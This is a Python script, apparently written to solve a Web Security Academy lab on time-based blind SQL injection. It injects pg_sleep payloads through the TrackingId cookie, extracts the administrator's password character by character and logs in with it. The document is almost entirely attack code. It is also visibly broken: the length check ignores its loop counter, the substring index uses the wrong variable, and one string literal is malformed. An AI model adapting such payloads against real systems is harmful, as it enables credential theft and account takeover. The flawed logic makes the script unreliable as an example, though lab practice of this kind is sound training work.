#name of the lab
#Lab: Blind SQL injection with time delays and information retrieval
import requests
from time import sleep
from bs4 import BeautifulSoup
url = "https://ac921f2c1f5a7ed8c0293c330025003a.web-security-academy.net/filter?category=Food+%26+Drink"
s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
number = 1
session = requests.Session()
response = session.get(url)
track = session.cookies.get_dict()["TrackingId"]
trackingID = track + "%3BSELECT+CASE+WHEN+(username=\'administrator\')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
resp = session.get(url)
if resp.elapsed.seconds > 8:
    print("user administrator found")

for a in range(1,40):
    trackingID = track + "TrackingId=x\'\"%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if response.elapsed.seconds > 9:
        number += 1
print("length of admin password found = "+str(number))
password = ""
for num in range(1,number+1):
    for letter in s:
        trackingID = track + "\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+SUBSTRING(password,"+str(number)+",1)='"+letter+""')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
        response = requests.get(url, cookies={'TrackingId': trackingID})
        if response.elapsed.seconds > 9:
            print(letter)
            password += letter

print(" admin password found: ")
print(password)
session = requests.session()
resp1 = session.get(url).text
soup = BeautifulSoup(resp1, "html.parser")
csrf = soup.find('input', {'name': 'csrf'})['value']
response = session.post(url, data={"username": "administrator", "password": password, "csrf": csrf})
if "logout" in response.text:# TO TEST
    print("challenge solved")
else:
    print("something does not work, incorrect data")
    print(response.text)